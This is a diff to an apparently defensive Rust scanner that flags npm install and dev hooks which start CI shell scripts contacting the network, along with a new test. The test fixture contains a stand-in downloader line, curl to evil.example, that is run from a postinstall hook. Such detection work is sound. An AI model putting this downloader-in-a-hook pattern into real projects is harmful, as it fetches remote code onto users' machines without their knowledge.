@@ -10,7 +10,7 @@
 //! honest. Those are listed, but contacting the internet doesn't make them a danger.
 
 use crate::git::RepoFile;
-use crate::network::{CALL, URL, clean_url, host_of, is_test_path};
+use crate::network::{CALL, FileClass, URL, classify, clean_url, host_of, is_test_path};
 use crate::report::{At, Kind, Report};
 use crate::text::Untrusted;
 use regex::bytes::Regex;
@@ -860,7 +860,9 @@ impl AutoRun {
 
             for script in &hook.runs {
                 let script_path = Untrusted::from_bytes(script.as_bytes());
-                if hook.severity == Severity::Raises {
+                // A CI script started from here isn't on a CI server any more.
+                let left_ci = classify(script) == FileClass::RunsElsewhere;
+                if hook.severity == Severity::Raises || left_ci {
                     for call in report.calls_in(script) {
                         report.add(
                             Kind::AutoRunNetwork,
@@ -1374,6 +1376,28 @@ mod tests {
                 expected,
                 "command: {command}"
             );
+        }
+    }
+
+    #[test]
+    fn a_ci_script_started_by_an_npm_script_is_checked_like_any_other() {
+        for (scripts, script) in [
+            (
+                r#"{"scripts":{"postinstall":"sh .azure-pipelines/a.sh"}}"#,
+                ".azure-pipelines/a.sh",
+            ),
+            (
+                r#"{"scripts":{"dev":"bash .github/a.sh && next dev"}}"#,
+                ".github/a.sh",
+            ),
+        ] {
+            let mut report = Report::new();
+            let downloader = file(script, "curl https://evil.example/x -o a\n");
+            crate::network::scan(&downloader, &mut report);
+
+            scan_all(&[file("package.json", scripts)], &mut report);
+
+            assert_eq!(report.listed(Kind::AutoRunNetwork).len(), 1, "{script}");
         }
     }
 
